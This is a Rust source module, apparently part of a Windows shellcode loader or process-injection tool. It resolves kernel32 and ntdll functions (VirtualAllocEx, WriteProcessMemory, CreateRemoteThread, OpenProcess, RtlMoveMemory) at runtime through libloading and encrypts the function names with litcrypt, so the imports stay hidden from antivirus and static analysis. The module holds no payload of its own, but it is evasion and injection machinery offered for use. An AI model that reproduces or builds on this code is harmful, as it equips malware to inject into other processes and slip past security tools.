pub mod Constants {
    pub const PROCESS_ALL_ACCESS: u32 = 0x1fffff;
    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const PAGE_EXECUTE: u32 = 0x10;
    pub const PAGE_READWRITE: u32 = 0x04;
    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    pub const PAGE_EXECUTE_READ: u32 = 0x20;
    pub const FALSE: i32 = 0;
    pub const PROCESS_CREATE_THREAD: u32 = 0x0002;
    pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    pub const PROCESS_VM_OPERATION: u32 = 0x0008;
    pub const PROCESS_VM_READ: u32 = 0x0010;
    pub const PROCESS_VM_WRITE: u32 = 0x0020;
}

pub mod Functions {

    use litcrypt::lc;
    use lazy_static::lazy_static;
    use libloading::os::windows::Symbol;
    use libloading::Library;
    use std::ffi::c_void;
    use std::ptr::{null, null_mut};

    pub struct obf_kernel32 {
        pub VirtualAlloc:
            Symbol<unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void>,
        pub VirtualAllocEx:
            Symbol<unsafe extern "C" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void>,
        pub VirtualProtect: Symbol<unsafe extern "C" fn(*const c_void, usize, u32, u32) -> u32>,
        pub VirtualProtectEx:
            Symbol<unsafe extern "C" fn(isize, *const c_void, usize, u32, *mut u32) -> i32>,
        pub CreateThread: Symbol<
            unsafe extern "C" fn(
                *const c_void,
                usize,
                *const c_void,
                *const c_void,
                u32,
                *mut u32,
            ) -> isize,
        >,
        pub CreateRemoteThread: Symbol<
            unsafe extern "C" fn(
                isize,
                *const c_void,
                usize,
                *const c_void,
                *const c_void,
                usize,
                *mut c_void,
            ) -> isize,
        >,
        pub OpenProcess: Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize>,
        pub CloseHandle: Symbol<unsafe extern "C" fn(isize) -> u32>,
        pub WriteProcessMemory: Symbol<
            unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
        >,
    }

    pub struct obf_ntdll {
        pub RtlMoveMemory: Symbol<unsafe extern "C" fn(*mut c_void, *const c_void, usize)>,
    }

    pub fn initialize_obf_ntdll() -> obf_ntdll {
        unsafe {
            let ntdll = Library::new(lc!("ntdll.dll")).unwrap();
            let rtl_move_memory: libloading::Symbol<
                unsafe extern "C" fn(*mut c_void, *const c_void, usize),
            > = ntdll.get(&[lc!("RtlMoveMemory").as_bytes(), b"\0"].concat()).unwrap();
            return obf_ntdll {
                RtlMoveMemory: rtl_move_memory.into_raw(),
            };
        }
    }

    pub fn initialize_obf_kernel32() -> obf_kernel32 {
        unsafe {
            let kernel32 = Library::new("kernel32.dll").unwrap();

            let virtual_alloc: libloading::Symbol<
                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
            > = kernel32.get(&[lc!("VirtualAlloc").as_bytes(), b"\0"].concat()).unwrap();

            let virtual_protect: libloading::Symbol<
                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> u32,
            > = kernel32.get(&[lc!("VirtualProtect").as_bytes(), b"\0"].concat()).unwrap();

            let create_thread: libloading::Symbol<
                unsafe extern "C" fn(
                    *const c_void,
                    usize,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut u32,
                ) -> isize,
            > = kernel32.get(&[lc!("CreateThread").as_bytes(), b"\0"].concat()).unwrap();

            let open_process: libloading::Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize> =
                kernel32.get(&[lc!("OpenProcess").as_bytes(), b"\0"].concat()).unwrap();

            let virtual_alloc_ex: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void,
            > = kernel32.get(&[lc!("VirtualAllocEx").as_bytes(), b"\0"].concat()).unwrap();

            let write_process_memory: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
            > = kernel32.get(&[lc!("WriteProcessMemory").as_bytes(), b"\0"].concat()).unwrap();

            let virtual_protect_ex: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, usize, u32, *mut u32) -> i32,
            > = kernel32.get(&[lc!("VirtualProtectEx").as_bytes(), b"\0"].concat()).unwrap();

            let create_remote_thread: libloading::Symbol<
                unsafe extern "C" fn(
                    isize,
                    *const c_void,
                    usize,
                    *const c_void,
                    *const c_void,
                    usize,
                    *mut c_void,
                ) -> isize,
            > = kernel32.get(&[lc!("CreateRemoteThread").as_bytes(), b"\0"].concat()).unwrap();

            let close_handle: libloading::Symbol<unsafe extern "C" fn(isize) -> u32> =
                kernel32.get(&[lc!("CloseHandle").as_bytes(), b"\0"].concat()).unwrap();

            return obf_kernel32 {
                VirtualAlloc: virtual_alloc.into_raw(),
                VirtualProtect: virtual_protect.into_raw(),
                CreateThread: create_thread.into_raw(),
                OpenProcess: open_process.into_raw(),
                VirtualAllocEx: virtual_alloc_ex.into_raw(),
                WriteProcessMemory: write_process_memory.into_raw(),
                VirtualProtectEx: virtual_protect_ex.into_raw(),
                CreateRemoteThread: create_remote_thread.into_raw(),
                CloseHandle: close_handle.into_raw(),
            };
        }
    }

    lazy_static! {
        pub static ref OBF_KERNEL32: obf_kernel32 = initialize_obf_kernel32();
        pub static ref OBF_NTDLL: obf_ntdll = initialize_obf_ntdll();
    }
}
